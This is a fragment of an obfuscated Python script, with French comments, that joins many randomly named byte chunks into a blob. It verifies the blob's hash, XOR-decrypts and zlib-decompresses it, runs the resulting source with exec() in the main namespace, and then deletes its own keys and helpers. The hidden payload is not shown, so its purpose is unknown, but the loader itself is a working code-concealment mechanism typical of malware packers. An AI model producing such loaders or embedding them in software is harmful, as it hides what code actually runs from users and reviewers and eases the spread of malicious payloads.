_ckQYC5c0Cuul3N + _cpNJDI0f5j7f93 + _cjMtLelc8sb11G + _cehlk3GHDOhqrn + _cgj33MQRc_A0Rm + _ceEbH_YSHMoLLB + _cpG79PT0ZPQUWE + _cqJMtAtz6SkGKV + _cpDFqenfFA0V9o + _cpwZPEaJnGGHk_ + _cujDLMPEL2l9mC + _csnGBNxKV_p5s9 + _c_BGFlSimYwlKu + _cdYzy7PouYfnxH + _cfhAutiTZ__PyV + _ciT_HH_kLBS2My + _cfyAyKM7vM91On + _cfUdixL26_FHJx + _cxwKwSga19aaKQ + _ctH92p3X7BrODK + _cj7o3fUIFpz2Qo + _cxl13waxu9aJDP + _cjT2T2Q52TYVgu)
if __import__('hashlib').sha256(_pd_bUDaQuAnPv6).hexdigest() != 'f998ac8597d6875044e1bf60b9c1980ea93d8980d512d61fc07a7914f0f410a2':
    __import__('sys').exit(1)
_xjoNd7WRgtcXsH = bytes([226, 23, 134, 154, 122, 206, 62, 99])
_fkscARszLQQj6Cx = bytes([110, 96, 209, 65, 127, 63, 81, 92])

def _fxiQNEUcIEKf2YM(_bkOlecSccVIdeH, _klVZzJRfMIJTWU):
    return bytes(_bkOlecSccVIdeH[_isrSlkNqW6YoDk] ^ _klVZzJRfMIJTWU[_isrSlkNqW6YoDk % len(_klVZzJRfMIJTWU)] for _isrSlkNqW6YoDk in range(len(_bkOlecSccVIdeH)))

def _fdszI2YRpEooCss(_tsIO2fH62KeL1k):
    import zlib
    return zlib.decompress(_tsIO2fH62KeL1k) # Un seul niveau de zlib ici pour simplifier

def _feh0atSOi5bLvDo():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xwA7bJNTvJLfxe = _fxiQNEUcIEKf2YM(_pd_bUDaQuAnPv6, _xjoNd7WRgtcXsH)
    # 2. Décompression Zlib
    _drfm9rvSWYwUME = _fdszI2YRpEooCss(_xwA7bJNTvJLfxe)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _drfm9rvSWYwUME.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nrMb5hr4ljKUj2 = _main.__dict__
    _nrMb5hr4ljKUj2.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nrMb5hr4ljKUj2)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feh0atSOi5bLvDo()
try:
    del _fxiQNEUcIEKf2YM, _fdszI2YRpEooCss, _feh0atSOi5bLvDo
    del _pd_bUDaQuAnPv6, _xjoNd7WRgtcXsH, _fkscARszLQQj6Cx
except:
    pass
